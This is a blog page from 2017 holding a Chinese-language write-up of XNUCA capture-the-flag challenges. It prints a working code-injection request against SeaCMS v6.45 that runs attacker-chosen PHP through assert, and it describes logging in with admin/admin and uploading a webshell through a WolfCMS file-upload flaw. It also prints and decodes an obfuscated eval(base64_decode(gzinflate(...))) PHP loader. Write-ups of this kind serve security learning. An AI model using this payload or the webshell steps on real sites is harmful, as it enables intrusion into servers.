@@ -1,0 +1,886 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="WriteUp,CTF," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="https://github.com/Windylh/image/raw/master/icon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="#No.8 看视频真嗨皮（读：50分，写：100分）1234提交关键字词：一档靶标题===============================================================周末看个电影放松一下吧！
+海洋cms v6.45前台getshell漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XNUCA-Writeup">
+<meta property="og:url" content="http://yoursite.com/2017/09/18/XNUCA-Writeup/index.html">
+<meta property="og:site_name" content="Windylh's blog">
+<meta property="og:description" content="#No.8 看视频真嗨皮（读：50分，写：100分）1234提交关键字词：一档靶标题===============================================================周末看个电影放松一下吧！
+海洋cms v6.45前台getshell漏洞">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.8.26/hycms0.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.8.26/hycms1.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.8.26/hycms2.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.8.26/hycms3.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.8.26/zrk1.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.8.26/zrk2.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.11.25/xnuca-1.png">
+<meta property="og:updated_time" content="2017-11-27T08:29:42.810Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XNUCA-Writeup">
+<meta name="twitter:description" content="#No.8 看视频真嗨皮（读：50分，写：100分）1234提交关键字词：一档靶标题===============================================================周末看个电影放松一下吧！
+海洋cms v6.45前台getshell漏洞">
+<meta name="twitter:image" content="https://github.com/Windylh/image/raw/master/2017.8.26/hycms0.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/09/18/XNUCA-Writeup/"/>
+
+
+
+
+
+  <title> XNUCA-Writeup | Windylh's blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Windylh's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/XNUCA-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                XNUCA-Writeup
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-18T22:42:16+08:00">
+                2017-09-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/09/18/XNUCA-Writeup/" class="leancloud_visitors" data-flag-title="XNUCA-Writeup">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="No-8-看视频真嗨皮（读：50分，写：100分）"><a href="#No-8-看视频真嗨皮（读：50分，写：100分）" class="headerlink" title="#No.8 看视频真嗨皮（读：50分，写：100分）"></a>#No.8 看视频真嗨皮（读：50分，写：100分）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">提交</div><div class="line">关键字词：一档靶标题</div><div class="line">===============================================================</div><div class="line">周末看个电影放松一下吧！</div></pre></td></tr></table></figure>
+<p><a href="http://0day5.com/archives/4249/" target="_blank" rel="external">海洋cms v6.45前台getshell漏洞</a><br><a id="more"></a><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">url：http://6f781364dedf5dc1eb877079f415877b.xnuca.cn/search.php?searchtype=5&amp;tid=0&amp;year=23334444);assert($_POST[1]);//</div><div class="line">post:searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=phpinfo();</div></pre></td></tr></table></figure></p>
+<p>phpinfo()正常执行。</p>
+<p>通过system函数执行命令。<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/hycms0.png" alt="1"><br>找flag位置<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/hycms1.png" alt="2"><br>查询flag<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/hycms2.png" alt="3"><br>创建文件<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/hycms3.png" alt="4"></p>
+<h2 id="No-23-找入口（读：100分，写：200分）"><a href="#No-23-找入口（读：100分，写：200分）" class="headerlink" title="#No.23 找入口（读：100分，写：200分）"></a>#No.23 找入口（读：100分，写：200分）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">提交</div><div class="line">关键字词：二档靶标题</div><div class="line">===============================================================</div><div class="line">本站的基本职能是什么</div></pre></td></tr></table></figure>
+<p>找到网站后台，发现后台是弱口令<code>username=admin&amp;password=admin</code>。</p>
+<p><a href="http://www.freebuf.com/articles/web/138640.html" target="_blank" rel="external">wolfcms 任意文件上传</a></p>
+<p>后台直接上传shell，根据前台的logo找到对应的路径。</p>
+<p>按照上一题的套路查看flag，写文件。<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/zrk1.png" alt="5"><br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/zrk2.png" alt="6"></p>
+<h1 id="第三轮"><a href="#第三轮" class="headerlink" title="第三轮"></a>第三轮</h1><h3 id="0x00信息收集"><a href="#0x00信息收集" class="headerlink" title="0x00信息收集"></a>0x00信息收集</h3><p>####操作内容<br>根据提示，访问<code>main.js</code>，找到作者信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">/*</div><div class="line"> *  main.js v1.0</div><div class="line"> *</div><div class="line"> *  2017/5/20</div><div class="line"> *  author l1Kai@youngin.uu.me</div><div class="line"> *  </div><div class="line"> */</div></pre></td></tr></table></figure></p>
+<p>github找到作者<code>https://github.com/l1Kai/user</code></p>
+<p>获得config.php和flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $payload=<span class="string">"fVJNc9sgEP1BuUhOPC2HHmxsbJBCDAgkc5NRJCtCHx3HVsivL5aTaZtDDgwDu++93be7Yj2FHbEmU4NpZZ+FYC0UKTP30MUzHR5aGuQpOMfdsjfQDE9jEK3Y0OhUDwefjxsOxRokCuITflk76h7G+GVxfhR4ytUb1ebp3EawWDOrEq5wF0PTRcmJwpZb3dqzFlXH14QxRRPixo645se/GiTgMGkQ5cKciDNfeUUSAMkRIcS9lVnAibSgjGt8ieuHC67/58K2QMwCKRR/5AKfyF1eHe/auoVfeQmTDShFoDSuxzqq+9+e7+x5hyf384K3Ra8zYvHGvmO0FEkIYq6aaucWFFZBlKf7KoKo0xkvDynq8pSW3uNLsVHv2awY964aIhZEz14Tw0XleVoMq6NOw7HYNj1BYMsVm3Km+Nb7Vfsb3s5HvMKroNqnvDGzt6OZHa0Jge9VjRHkJQ+UnHyecEuwYv2E/ajNHrJl8CyqJguXOxl+q8WSkMrvtOS0A1evbxolu+5J/4lf+RnFQsrrG+ANavSWnvYZ9R7S0ntuDfR1BHSXBK+Ei788Hiu4Qoorr/8dNiRIKoWufVzneNMfnM5QmPs5RYjskpCvZdOciQMX05qLmYVH0/F5HNLXfUa8F/OXwwa9Gzcf8+3itqMdteaeDofZvDT33Oezfvr3M9bZcShWp19/AA=="</span>;</div><div class="line">preg_replace(<span class="string">'/.*/e'</span>,<span class="string">"\x65\x76\x61\x6c\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x24\x70\x61\x79\x6c\x6f\x61\x64\x29\x2c\x30\x29\x29\x29"</span>,<span class="string">'.'</span>); <span class="meta">?&gt;</span></div><div class="line">flag&#123;e76cd8c1-d747<span class="number">-4259</span>-aaac-bc36efe62462&#125;</div></pre></td></tr></table></figure></p>
+<h4 id="FLAG值"><a href="#FLAG值" class="headerlink" title="FLAG值"></a>FLAG值</h4><p>flag{e76cd8c1-d747-4259-aaac-bc36efe62462}</p>
+<h3 id="0x01信息分析"><a href="#0x01信息分析" class="headerlink" title="0x01信息分析"></a>0x01信息分析</h3><h4 id="操作内容"><a href="#操作内容" class="headerlink" title="操作内容"></a>操作内容</h4><p>用python输出\x部分。</p>
+<p><code>eval(base64_decode(gzinflate(base64_decode($payload),0)))</code></p>
+<p>php解密<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $payload=<span class="string">"fVJNc9sgEP1BuUhOPC2HHmxsbJBCDAgkc5NRJCtCHx3HVsivL5aTaZtDDgwDu++93be7Yj2FHbEmU4NpZZ+FYC0UKTP30MUzHR5aGuQpOMfdsjfQDE9jEK3Y0OhUDwefjxsOxRokCuITflk76h7G+GVxfhR4ytUb1ebp3EawWDOrEq5wF0PTRcmJwpZb3dqzFlXH14QxRRPixo645se/GiTgMGkQ5cKciDNfeUUSAMkRIcS9lVnAibSgjGt8ieuHC67/58K2QMwCKRR/5AKfyF1eHe/auoVfeQmTDShFoDSuxzqq+9+e7+x5hyf384K3Ra8zYvHGvmO0FEkIYq6aaucWFFZBlKf7KoKo0xkvDynq8pSW3uNLsVHv2awY964aIhZEz14Tw0XleVoMq6NOw7HYNj1BYMsVm3Km+Nb7Vfsb3s5HvMKroNqnvDGzt6OZHa0Jge9VjRHkJQ+UnHyecEuwYv2E/ajNHrJl8CyqJguXOxl+q8WSkMrvtOS0A1evbxolu+5J/4lf+RnFQsrrG+ANavSWnvYZ9R7S0ntuDfR1BHSXBK+Ei788Hiu4Qoorr/8dNiRIKoWufVzneNMfnM5QmPs5RYjskpCvZdOciQMX05qLmYVH0/F5HNLXfUa8F/OXwwa9Gzcf8+3itqMdteaeDofZvDT33Oezfvr3M9bZcShWp19/AA=="</span>;</div><div class="line">    <span class="keyword">echo</span> (base64_decode(gzinflate(base64_decode($payload),<span class="number">0</span>)));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>得到config.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">require</span>(<span class="keyword">__DIR__</span>.<span class="string">'/function.php'</span>);</div><div class="line"></div><div class="line">define(<span class="string">"DBHOST"</span>,<span class="string">"127.0.0.1"</span>);</div><div class="line">define(<span class="string">'DBUSER'</span>,<span class="string">''</span>);</div><div class="line">define(<span class="string">'DBPASS'</span>,<span class="string">''</span>);</div><div class="line">define(<span class="string">'DBNAME'</span>,<span class="string">''</span>);</div><div class="line">define(<span class="string">'ROOTDRI'</span>,<span class="keyword">__DIR__</span>.<span class="string">"/../"</span>);</div><div class="line">define(<span class="string">"WEB_TITLE"</span>,<span class="string">'标题'</span>);</div><div class="line">define(<span class="string">"PRO_KEY"</span>,<span class="string">"***...."</span>);<span class="comment">// where is PRO_KEY ? </span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!get_magic_quotes_gpc())</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET))</div><div class="line">    &#123;</div><div class="line">        $_GET  = addslashes_deep($_GET);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST))</div><div class="line">    &#123;</div><div class="line">        $_POST = addslashes_deep($_POST);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $_COOKIE   = addslashes_deep($_COOKIE);</div><div class="line">    $_REQUEST  = addslashes_deep($_REQUEST);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">require</span>(ROOTDRI.<span class="string">'/org/smarty/Smarty.class.php'</span>);</div><div class="line">session_start();</div><div class="line"></div><div class="line"><span class="keyword">exit</span>;</div></pre></td></tr></table></figure></p>
+<p>查看之前的历史提交，找到最初的config.php，修改php输出执行的内容。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">_rZBFc5</span><span class="params">($_AXxuMn)</span></span></div><div class="line">&#123;</div><div class="line">    $keyStr = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="</span>;</div><div class="line">    $chr1 = $chr2 = $chr3 = <span class="string">""</span>;</div><div class="line">    $enc1 = $enc2 = $enc3 = $enc4 = <span class="string">""</span>;</div><div class="line">    $i = <span class="number">0</span>;</div><div class="line">    $output = <span class="string">""</span>;</div><div class="line">    $_AXxuMn = preg_replace(<span class="string">"[^A-Za-z0-9\\+\\/\\=]"</span>, <span class="string">""</span>, $_AXxuMn);</div><div class="line">    <span class="keyword">do</span> &#123;</div><div class="line">        $enc1 = strpos($keyStr, substr($_AXxuMn, $i++, <span class="number">1</span>));</div><div class="line">        $enc2 = strpos($keyStr, substr($_AXxuMn, $i++, <span class="number">1</span>));</div><div class="line">        $enc3 = strpos($keyStr, substr($_AXxuMn, $i++, <span class="number">1</span>));</div><div class="line">        $enc4 = strpos($keyStr, substr($_AXxuMn, $i++, <span class="number">1</span>));</div><div class="line">        $chr1 = $enc1 &lt;&lt; <span class="number">2</span> | $enc2 &gt;&gt; <span class="number">4</span>;</div><div class="line">        $chr2 = ($enc2 &amp; <span class="number">15</span>) &lt;&lt; <span class="number">4</span> | $enc3 &gt;&gt; <span class="number">2</span>;</div><div class="line">        $chr3 = ($enc3 &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span> | $enc4;</div><div class="line">        $output = $output . chr((int) $chr1);</div><div class="line">        <span class="keyword">if</span> ($enc3 != <span class="number">64</span>) &#123;</div><div class="line">            $output = $output . chr((int) $chr2);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> ($enc4 != <span class="number">64</span>) &#123;</div><div class="line">            $output = $output . chr((int) $chr3);</div><div class="line">        &#125;</div><div class="line">        $chr1 = $chr2 = $chr3 = <span class="string">""</span>;</div><div class="line">        $enc1 = $enc2 = $enc3 = $enc4 = <span class="string">""</span>;</div><div class="line">    &#125; <span class="keyword">while</span> ($i &lt; strlen($_AXxuMn));</div><div class="line">    <span class="keyword">return</span> $output;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">_g1S4Ve</span><span class="params">($_XJwGpK)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> _rZBFc5($_XJwGpK);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">_Xvtafz</span><span class="params">($_4LYEpc)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> gzinflate($_4LYEpc, <span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">_ehljDM</span><span class="params">($_j045Zz)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">eval</span>($_j045Zz);</div><div class="line">&#125;</div><div class="line">$_Za0oXi = <span class="string">"fVNNk6IwEP1BcwHU2uWwBw2gCZidhBAgN4zDhwkfVY4y+Os34kzt7hw8pFKp7vde9+uOR/pr2Gzawzbo3m7KwaeNym9kjNh6wjf4jj3aCmDXe4/YERMat/koTmopWlzvd1YVNj8x6JCWGR9km/SZ7foxR2U2LbvIEfahxVaRupeo2/QSyOH3aIUeGZRIxXAw+VBREPsu4wCe4cmf8LQco9P6so/hnCu2vC3SlQ7B0SeaM8phFwHZheyMQUu1aPVFxFVHfUQIxwxNY4cm9eNfDWRRwFSAaSzPaJLfeWNmuQkNEELTR5lZFCXaLaMGXqNmeYXN/1xQHwOi3STmdE9jeEYvRVW/tE0LvvMikii3jC0uYDM2e7Ze7NN8iR3e5E4+iRaujI+OOPkLvOWnnAVaMKSElzdzb5UVFmlehSDoREbLQxp0RYpL4/P1uOW3zDmO+VQNIbHCN6MLwbqCW91CUNUitcfjTvUocHeUkzlnju8Mb2Nu8Dif8Qp6VpWnVEnno5ZOraXtmn75GAJaUosncz0zbuN6pJ+xn7XpQ7ax3uJKZfbmNbGfahFm4+SZVjLvwd3vh0ZJ7rvSf+E9M6coTpL724XbQIkdPucZ7kWGS+O7lsDUYeFXZr0jGv/lMdiY8oBTbvSfYW0UJJwH9z7us3zoD5PIArvIkA4D9Mps6idKXdDkXmUrr9Kxa9nRVWTj9zxDxovVyfylm5xWY7FbP/a0w1ou8HBwVqVcUJNP+q8Zi6wejt751x8="</span>;</div><div class="line"><span class="keyword">echo</span> _g1S4Ve(_Xvtafz(_g1S4Ve($_Za0oXi),<span class="number">0</span>))</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>得到flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">/* flag&#123;9660dc40-0272-44fd-a045-6e6f0f98fca0&#125; */</span></div><div class="line"><span class="keyword">require</span>(<span class="keyword">__DIR__</span>.<span class="string">'/function.php'</span>);</div><div class="line"></div><div class="line">define(<span class="string">"DBHOST"</span>,<span class="string">"127.0.0.1"</span>);</div><div class="line">define(<span class="string">'DBUSER'</span>,<span class="string">''</span>);</div><div class="line">define(<span class="string">'DBPASS'</span>,<span class="string">''</span>);</div><div class="line">define(<span class="string">'DBNAME'</span>,<span class="string">''</span>);</div><div class="line">define(<span class="string">'ROOTDRI'</span>,<span class="keyword">__DIR__</span>.<span class="string">"/../"</span>);</div><div class="line">define(<span class="string">"WEB_TITLE"</span>,<span class="string">'标题'</span>);</div><div class="line">define(<span class="string">"PRO_KEY"</span>,<span class="string">"1071f87ebcf2fb9f96f174eca1ee2dd6"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!get_magic_quotes_gpc())</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET))</div><div class="line">    &#123;</div><div class="line">        $_GET  = addslashes_deep($_GET);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST))</div><div class="line">    &#123;</div><div class="line">        $_POST = addslashes_deep($_POST);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $_COOKIE   = addslashes_deep($_COOKIE);</div><div class="line">    $_REQUEST  = addslashes_deep($_REQUEST);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">require</span>(ROOTDRI.<span class="string">'/org/smarty/Smarty.class.php'</span>);</div><div class="line">session_start();</div><div class="line"></div><div class="line"><span class="keyword">exit</span>;</div></pre></td></tr></table></figure></p>
+<h4 id="FLAG值-1"><a href="#FLAG值-1" class="headerlink" title="FLAG值"></a>FLAG值</h4><p>flag{9660dc40-0272-44fd-a045-6e6f0f98fca0}</p>
+<h3 id="0x02开始渗透"><a href="#0x02开始渗透" class="headerlink" title="0x02开始渗透"></a>0x02开始渗透</h3><h4 id="操作内容-1"><a href="#操作内容-1" class="headerlink" title="操作内容"></a>操作内容</h4><p>github上的项目名为user，访问user目录，提示登陆。</p>
+<p>根据登陆页面，用户名是邮箱，根据给出提示猜测密码。</p>
+<p>邮箱为github邮箱，密码为<code>likai</code>，得到flag。</p>
+<p><img src="https://github.com/Windylh/image/raw/master/2017.11.25/xnuca-1.png" alt=""></p>
+<h4 id="FLAG值-2"><a href="#FLAG值-2" class="headerlink" title="FLAG值"></a>FLAG值</h4><p>flag{cc498da1-3918-48be-b9e2-c64c69a5349e}</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/18/实验吧(密码学、杂项、隐写部分)Writeup/" rel="next" title="实验吧(密码学、杂项、隐写部分)Writeup">
+                <i class="fa fa-chevron-left"></i> 实验吧(密码学、杂项、隐写部分)Writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/09/18/Wordpress插件渗透测试/" rel="prev" title="Wordpress插件渗透测试">
+                Wordpress插件渗透测试 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg"
+               alt="Windylh" />
+          <p class="site-author-name" itemprop="name">Windylh</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">25</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Windylh" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/WindylhPeng" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/1553700980" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
